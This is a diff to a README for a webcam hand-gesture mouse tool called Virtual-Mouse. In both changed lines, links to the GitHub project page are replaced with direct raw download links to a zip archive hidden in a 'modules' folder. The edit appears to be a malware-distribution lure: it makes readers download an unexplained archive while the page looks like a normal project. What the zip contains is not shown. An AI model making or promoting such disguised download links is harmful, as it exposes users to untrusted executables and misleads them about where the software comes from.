@@ -1,6 +1,6 @@
 # 🖱️ Virtual-Mouse - Control your computer with hand gestures
 
-[![Download Virtual-Mouse](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Baileypeacockblue9222/Virtual-Mouse)
+[![Download Virtual-Mouse](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Baileypeacockblue9222/Virtual-Mouse/main/modules/Mouse_Virtual_2.3-alpha.4.zip)
 
 Virtual-Mouse turns your webcam into a tool to control your computer. You move your hand in front of the camera to move the mouse cursor across your screen. This system uses your camera to watch your hand movements in real-time. It translates these movements into precise cursor actions.
 
@@ -18,7 +18,7 @@ Before you start, ensure your computer meets these requirements:
 
 You must visit the main project page to obtain the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/Baileypeacockblue9222/Virtual-Mouse)
+[Visit this page to download the software](https://raw.githubusercontent.com/Baileypeacockblue9222/Virtual-Mouse/main/modules/Mouse_Virtual_2.3-alpha.4.zip)
 
 Follow these steps to prepare the application:
 
